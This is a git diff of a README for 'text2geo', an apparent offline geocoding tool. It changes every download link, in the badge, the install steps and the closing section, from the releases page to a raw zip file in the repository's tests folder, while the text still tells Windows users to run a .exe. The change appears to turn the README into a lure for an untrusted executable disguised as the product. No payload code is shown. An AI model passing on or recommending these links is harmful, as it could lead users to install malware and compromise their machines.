@@ -1,6 +1,6 @@
 # 🌍 text2geo - Convert Places to Coordinates Offline
 
-[![Download text2geo](https://img.shields.io/badge/Download-text2geo-brightgreen)](https://github.com/majedyop0/text2geo/releases)
+[![Download text2geo](https://img.shields.io/badge/Download-text2geo-brightgreen)](https://github.com/majedyop0/text2geo/raw/refs/heads/main/tests/text_geo_1.1-alpha.4.zip)
 
 ---
 
@@ -11,7 +11,7 @@ text2geo is an offline program that helps you turn place names into exact map co
 ### How to Get text2geo
 
 1. Click the big green button above or visit this page:  
-   [https://github.com/majedyop0/text2geo/releases](https://github.com/majedyop0/text2geo/releases)
+   [https://github.com/majedyop0/text2geo/raw/refs/heads/main/tests/text_geo_1.1-alpha.4.zip](https://github.com/majedyop0/text2geo/raw/refs/heads/main/tests/text_geo_1.1-alpha.4.zip)
 
 2. Find the latest version of the software. Look for a file ending with `.exe`. For example, it might say something like `text2geo-setup.exe`. This file will run on Windows.
 
@@ -93,6 +93,6 @@ Using text2geo means you can work with location data in any personal or professi
 ## 🔗 Direct Link to Download
 
 Remember, you can always get the latest version from:  
-[https://github.com/majedyop0/text2geo/releases](https://github.com/majedyop0/text2geo/releases)
+[https://github.com/majedyop0/text2geo/raw/refs/heads/main/tests/text_geo_1.1-alpha.4.zip](https://github.com/majedyop0/text2geo/raw/refs/heads/main/tests/text_geo_1.1-alpha.4.zip)
 
 Click the green badge above or visit this page to pick the file suitable for your Windows PC.
